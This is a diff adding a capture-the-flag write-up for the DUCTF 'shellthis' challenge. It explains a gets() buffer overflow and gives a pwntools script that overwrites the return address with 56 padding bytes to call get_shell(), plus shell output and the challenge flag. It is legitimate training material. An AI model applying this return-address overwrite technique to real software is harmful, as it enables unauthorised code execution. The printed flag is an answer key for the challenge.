@@ -1,0 +1,51 @@
+DESCRIPTION:
+
+  Somebody told me that this program is vulnerable to something called remote code execution?
+  I'm not entirely sure what that is, but could you please figure it out for me?
+----------------------------------------------------------------------------------------------
+
+This was a buffer overflow challenge, Because of the gets() usage in the code
+ 
+ 1. objdump -d shellthis
+ 2. Get the offset or the address for the get_shell() function : 0x4006ca
+
+Use the script below and 
+
+----------------------------------------------------------------------------------------------
+
+#!/usr/bin/python3 
+
+from pwn import *
+
+r = process('./shellthis')
+
+win = p64(0x4006ca)
+print("win : p64(0x4006ca) -> {})".format(win))
+
+payload = b'A' * 56
+print("payload 1 : {}".format(payload))
+
+payload += win
+print("payload 2 : {}".format(payload))
+
+r.recvline()
+r.sendline(payload)
+r.interactive()
+
+
+----------------------------------------------------------------------------------------------
+
+The above script runs for local system.
+For the challenge remove/replace  || r = process('./shellthis') ||
+                                  || r = remote('chal.duc.tf', 30002) ||
+
+$ls
+flag.txt
+shellthis
+$ cat flag.txt
+DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
+
+-------------------------------------------------
+flag : DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
+--------------------------------------------------
+------------------------------------
